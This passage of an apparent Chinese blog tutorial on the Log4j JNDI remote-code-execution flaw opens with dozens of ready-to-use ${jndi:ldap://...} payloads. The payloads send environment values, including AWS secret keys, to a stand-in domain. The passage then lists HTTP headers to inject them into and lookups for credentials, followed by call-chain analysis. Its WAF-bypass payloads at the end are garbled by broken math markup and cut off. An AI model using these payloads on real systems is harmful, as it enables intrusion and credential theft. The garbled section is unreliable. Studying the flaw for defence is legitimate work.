<span class="token variable">$&#123;jndi:dns://$&#123;env:USERDOMAIN&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:dns://$&#123;env:AWS_SECRET_ACCESS_KEY.domain.com/a&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;ctx:loginId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;map:type&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;filename&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;date:MM-dd-yyyy&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:imageName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;env:USER&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;event:Marker&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;mdc:UserId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;java:runtime&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;java:vm&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;java:os&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;jndi:logging/context-name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;hostName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;docker:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:accountName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:clusterName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:containerId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:containerName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:host&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:labels.app&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:labels.podTemplateHash&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:masterUrl&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:namespaceId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:namespaceName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podIp&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:podName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:imageId&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;k8s:imageName&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;log4j:configLocation&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;log4j:configParentLocation&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;spring:spring.application.name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:myString&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:0&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:1&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:2&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:3&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:4&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;main:bar&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;marker&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;marker:name&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;spring:profiles.active[0].domain.com/j&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;sys:logPath&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:ldap://$&#123;web:rootDir&#125;</span>.domain.com/j<span class="token punctuation">&#125;</span>
</code></pre> 
 <p>可检查的标头</p> 
 <pre><code class="prism language-bash">Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Authorization
Cache-Control
Cf-Connecting_ip
Client-Ip
Contact
Cookie
DNT
Forwarded
Forwarded-For
Forwarded-For-Ip
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Origin
Originating-Ip
Pragma
Referer
TE
True-Client-IP
True-Client-Ip
Upgrade
User-Agent
Via
Warning
X-ATT-DeviceId
X-Api-Version
X-Att-Deviceid
X-CSRFToken
X-Client-Ip
X-Correlation-ID
X-Csrf-Token
X-Do-Not-Track
X-Foo
X-Foo-Bar
X-Forward-For
X-Forward-Proto
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Frame-Options
X-From
X-Geoip-Country
X-HTTP-Method-Override
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method
X-Http-Method-Override
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Originating-Ip
X-ProxyUser-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-Ip
X-Request-ID
X-Requested-With
X-UIDH
X-Wap-Profile
X-XSRF-TOKEN
Authorization: Basic 
Authorization: Bearer 
Authorization: Oauth 
Authorization: Token
</code></pre> 
 <p>除ldap以外的其他构造方式</p> 
 <pre><code class="prism language-bash">jndi:ldap:/
jndi:rmi:/
jndi:ldaps:/
jndi:dns:/
jndi:nis:/
jndi:nds:/
jndi:corba:/
jndi:iiop:/
jndi:$<span class="token punctuation">&#123;<!-- --></span>
</code></pre> 
 <p>可获取查找的信息</p> 
 <pre><code class="prism language-bash"><span class="token variable">$&#123;hostName&#125;</span>
<span class="token variable">$&#123;sys:user.name&#125;</span>
<span class="token variable">$&#123;sys:user.home&#125;</span>
<span class="token variable">$&#123;sys:user.dir&#125;</span>
<span class="token variable">$&#123;sys:java.home&#125;</span>
<span class="token variable">$&#123;sys:java.vendor&#125;</span>
<span class="token variable">$&#123;sys:java.version&#125;</span>
<span class="token variable">$&#123;sys:java.vendor.url&#125;</span>
<span class="token variable">$&#123;sys:java.vm.version&#125;</span>
<span class="token variable">$&#123;sys:java.vm.vendor&#125;</span>
<span class="token variable">$&#123;sys:java.vm.name&#125;</span>
<span class="token variable">$&#123;sys:os.name&#125;</span>
<span class="token variable">$&#123;sys:os.arch&#125;</span>
<span class="token variable">$&#123;sys:os.version&#125;</span>
<span class="token variable">$&#123;env:JAVA_VERSION&#125;</span>
<span class="token variable">$&#123;env:AWS_SECRET_ACCESS_KEY&#125;</span>
<span class="token variable">$&#123;env:AWS_SESSION_TOKEN&#125;</span>
<span class="token variable">$&#123;env:AWS_SHARED_CREDENTIALS_FILE&#125;</span>
<span class="token variable">$&#123;env:AWS_WEB_IDENTITY_TOKEN_FILE&#125;</span>
<span class="token variable">$&#123;env:AWS_PROFILE&#125;</span>
<span class="token variable">$&#123;env:AWS_CONFIG_FILE&#125;</span>
<span class="token variable">$&#123;env:AWS_ACCESS_KEY_ID&#125;</span>
</code></pre> 
 <p>一张脑图（有一说一不是很懂这个）<br> <img src="https://img-blog.csdnimg.cn/f44b105478ca4b4ebacd60249c65cf9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h2><a id="_329"></a><mark>批量验证工具</mark></h2> 
 <p><a target="_blank" rel="noopener" href="https://github.com/inbug-team/Log4j_RCE_Tool">log4j批量检测工具</a><br> 这个是主动检测的<br> 但是自己测了下,发觉测不出东西<br> 但是主动检测的太少了 还是把这个工具扔在这里<br> <img src="https://img-blog.csdnimg.cn/8e9287f280ce40e89c435dfb54e36a3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h1><a id="_335"></a>原理研究</h1> 
 <h2><a id="_336"></a>基础知识点</h2> 
 <p>JNDI<br> 全名：Java命名和目录接口，自己理解就是定义一个名称去绑定对象或者资源进而进行操控<br> 作用：将名称与java对象或资源关联起来，进行通过名称调用到对应的对象或者资源<br> 可操控的目录与服务有： DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、WindowsXP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p> 
 <p>运用方法：<br> 如JNDI数据源配置（使用的原因 只配置一次①加载数据库驱动程序、②连接数据库、④关闭数据库，释放连接，减少性能消耗）<br> 这个师傅讲的比较好了 这里就不讲了</p> 
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdp-gacl/p/3951952.html">参考链接</a></p> 
 <p><img src="https://img-blog.csdnimg.cn/6fc8cdd5e2034b02ac1cc2ce1791f925.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>LDAP(轻量目录访问协议)<br> LDAP目录服务：由目录数据库和一套访问协议组成的系统。<br> 作用：即存储描述属性的数据和详细信息的数据库。<br> 四种模型：</p> 
 <pre><code class="prism language-bash">信息模型
命名模型
功能模型
安全模型
</code></pre> 
 <p>连接LDAP数据库方法：</p> 
 <pre><code class="prism language-bash"><span class="token variable">$ldapconn</span> <span class="token operator">=</span> ldap_connect<span class="token punctuation">(</span>“10.1.8.78<span class="token string">")
<span class="token variable">$ldapbind</span> = ldap_bind(<span class="token variable">$ldapconn</span>, 'username', <span class="token variable">$ldappass</span>);
<span class="token variable">$searchRows</span>= ldap_search(<span class="token variable">$ldapconn</span>, <span class="token variable">$basedn</span>, "</span><span class="token punctuation">(</span>cn<span class="token operator">=</span>*<span class="token punctuation">)</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$searchResult</span> <span class="token operator">=</span> ldap_get_entries<span class="token punctuation">(</span><span class="token variable">$ldapconn</span>, <span class="token variable">$searchRows</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ldap_close<span class="token punctuation">(</span><span class="token variable">$ldapconn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
 <p>lookup：允许在写日志的时候，通过关键词去查找对象，输出对象，并实现对象功能。这个对象可以存储在硬盘中或者服务器上。</p> 
 <p>这个漏洞调用的就是这个接口</p> 
 <p>Codebase<br> 概念：一种服务<br> 作用：存储代码或者编译文件作用，可通过名称进行编译文件或者获取代码。</p> 
 <p>RMI协议：<br> 概念：远程方法调用协议，通过网络从远程计算机上请求调用某种服务。(只适合java)</p> 
 <p>原理：</p> 
 <pre><code class="prism language-bash">1.客户调用客户端辅助对象stub上的方法
2.客户端辅助对象stub打包调用信息（变量，方法名），通过网络发送给服务端辅助对象skeleton
3.服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象
4.调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton
5.服务端辅助对象将结果打包，发送给客户端辅助对象stub
6.客户端辅助对象将返回值解包，返回给调用者
7.客户获得返回值
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/3fa499394fd24ae781a710675c8acd81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h2><a id="_398"></a>漏洞原理知识点：</h2> 
 <p>加载原理：通过rmi进行从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类，进而造成RCE漏洞<br> <img src="https://img-blog.csdnimg.cn/69df0ca22e0b4552813cbd614b9b1583.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/f1dd7030daf84ef7a761550d2ce3145a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 详细跟进分析<br> 完整的调用链</p> 
 <pre><code class="prism language-bash">lookup:172, JndiManager <span class="token punctuation">(</span>org.apache.logging.log4j.core.net<span class="token punctuation">)</span>
lookup:56, JndiLookup <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
lookup:223, Interpolator <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
resolveVariable:1116, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
substitute:1038, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
substitute:912, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
replace:467, StrSubstitutor <span class="token punctuation">(</span>org.apache.logging.log4j.core.lookup<span class="token punctuation">)</span>
format:132, MessagePatternConverter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
format:38, PatternFormatter <span class="token punctuation">(</span>org.apache.logging.log4j.core.pattern<span class="token punctuation">)</span>
toSerializable:345, PatternLayout<span class="token variable">$PatternSerializer</span> <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
toText:244, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
encode:229, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
encode:59, PatternLayout <span class="token punctuation">(</span>org.apache.logging.log4j.core.layout<span class="token punctuation">)</span>
directEncodeEvent:197, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
tryAppend:190, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
append:181, AbstractOutputStreamAppender <span class="token punctuation">(</span>org.apache.logging.log4j.core.appender<span class="token punctuation">)</span>
tryCallAppender:156, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppender0:129, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppenderPreventRecursion:120, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppender:84, AppenderControl <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
callAppenders:543, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
processLogEvent:502, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:485, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:460, LoggerConfig <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:63, DefaultReliabilityStrategy <span class="token punctuation">(</span>org.apache.logging.log4j.core.config<span class="token punctuation">)</span>
log:161, Logger <span class="token punctuation">(</span>org.apache.logging.log4j.core<span class="token punctuation">)</span>
tryLogMessage:2198, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessageTrackRecursion:2152, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessageSafely:2135, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logMessage:2011, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
logIfEnabled:1983, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
error:740, AbstractLogger <span class="token punctuation">(</span>org.apache.logging.log4j.spi<span class="token punctuation">)</span>
main:8, log4jRCE
</code></pre> 
 <p>这里要重点关注的几个点,其余的点几乎都是调用方法或者是进行过滤操作获取数字等</p> 
 <p>①这里进行判断了日志等级 如果是小于配置文件的即不能进入 this.logMessage()进行触发漏洞<br> 日志等级 默认只要大于error()和fatal()可以触发漏洞就可以触发漏洞了 具体看配置情况</p> 
 <pre><code class="prism language-bash">日志一共分为8个级别，由低到高依次为：All <span class="token operator">&lt;</span> Trace <span class="token operator">&lt;</span> Debug <span class="token operator">&lt;</span> Info <span class="token operator">&lt;</span> Warn <span class="token operator">&lt;</span> Error <span class="token operator">&lt;</span> Fatal <span class="token operator">&lt;</span> OFF。
1.All：最低等级的，用于打开所有日志记录。
2.Trace：是追踪，就是程序推进以下，你就可以写个trace输出，所以trace应该会特别多，不过没关系，我们可以设置最低日志级别不让他输出。
3.Debug：指出细粒度信息事件对调试应用程序是非常有帮助的。
4.Info：消息在粗粒度级别上突出强调应用程序的运行过程。
5.Warn：输出警告及warn以下级别的日志。
6.Error：输出错误信息日志。
7.Fatal：输出每个严重的错误事件将会导致应用程序的退出的日志。
8.OFF：最高等级的，用于关闭所有日志记录。
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/73e3102efdd84a04a0fc2e7369f1b0a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>配置的最低等级的文件数值在org/apache/logging/log4j/spi/StandardLevel.java中</p> 
 <p>②log:460, LoggerConfig (org.apache.logging.log4j.core.config)这个地方<br> 上面的东西查了下感觉就是线程相关所以可以不看 核心还是log的方法<br> <img src="https://img-blog.csdnimg.cn/5799870557bc4082a264da1d296ca530.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>③MessagePatternConverter方法<br> <img src="https://img-blog.csdnimg.cn/139cf5be2ec844e09f17ae280e7e4b10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④跟replace方法<br> 调用substitute方法<br> <img src="https://img-blog.csdnimg.cn/ec08848f5f074a31aa61e45471e4dd5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 先调用一个substitute的方法<br> <img src="https://img-blog.csdnimg.cn/9bc5bd97ada242ffa66b06fa365b8414.png" alt=""><br> 然后调用另外一个substitute的重载函数进行处理数据<br> ⑤研究substitute方法<br> 初始化定义的一些变量名<br> <img src="https://img-blog.csdnimg.cn/e1e99abe2a6f4999b9ccfd3673400d34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>采用while循环逐个去寻找前缀这里的前缀定义即是$和{字符<br> 进行前缀匹配<br> <img src="https://img-blog.csdnimg.cn/8c89829dcec34b189cb9a5d10749bd54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>寻找后缀唯一区别就是可以理解为一个从前查找一个从后查找<br> <img src="https://img-blog.csdnimg.cn/f01fb3723b9a4cb9bc3a6cea5543794a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>然后进行匹配 :- 和 :<br> 对于这种字符的处理 看一个师傅的说法是<br> :-<br> 赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb<br> :-<br> 是转义的 :-，如果一个用 a:b 表示的键值对的 key a 中包含 :，则需要使用转义来配合处理，例如 ${aaa:\-bbb:-ccc}，代表 key 是，aaa:bbb，value 是 ccc。<br> <mark>这也是绕waf的的一些原因</mark></p> 
 <pre><code class="prism language-bash">因此结合这些递归解析以及特性我们可以进行绕waf
构造出一些类似于如此的一些payload去绕
<p><span class="token variable">&#123;&#123;::-j&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>n</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-n&#125;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">n</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>&#123;::-d&#125;</span><span class="token variable"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo>:</mo><mo>:</mo><mo>−</mo><mi>i</mi></mrow><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>k</mi><mi>e</mi><mi>y</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo><mo>:</mo><mo>&lt;</mo><mi mathvariant="normal">/</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mo>&gt;</mo><mo>&lt;</mo><mi>s</mi><mi>p</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>v</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&#123;::-i&#125;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mrel">:</span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord mathnormal">i</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" 